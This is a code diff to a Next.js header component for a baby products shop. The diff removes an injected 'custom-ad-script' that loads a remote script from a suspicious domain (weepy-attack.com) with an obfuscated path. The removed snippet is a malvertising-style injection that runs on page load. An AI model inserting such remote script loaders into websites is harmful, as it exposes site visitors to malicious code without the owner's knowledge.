@@ -25,21 +25,6 @@ export default function Header() {
   return (
     <>
       {/* SEO */}
-      <meta name="8e14bbdd94c8fba73ae094f9c07249548ec74659" content="8e14bbdd94c8fba73ae094f9c07249548ec74659" />
-      <Script id="custom-ad-script" strategy="afterInteractive">
-                {`
-          (function(xlu){
-            var d = document,
-                s = d.createElement('script'),
-                l = d.scripts[d.scripts.length - 1];
-            s.settings = xlu || {};
-            s.src = "//weepy-attack.com/b.XPVqsBdWGtl/0yYfWccv/eekmi9HuaZ_UslHk_PuTcYT2/MBzMQi3eNuTLAztINmjpYTzQNnDjci1pMYQg";
-            s.async = true;
-            s.referrerPolicy = 'no-referrer-when-downgrade';
-            l.parentNode.insertBefore(s, l);
-          })({})
-        `}
-            </Script>
       <Head>
         <title>Baby Bliss Boutique - Premium Baby Products</title>
         <link rel="icon" href="/images/logo.png" />
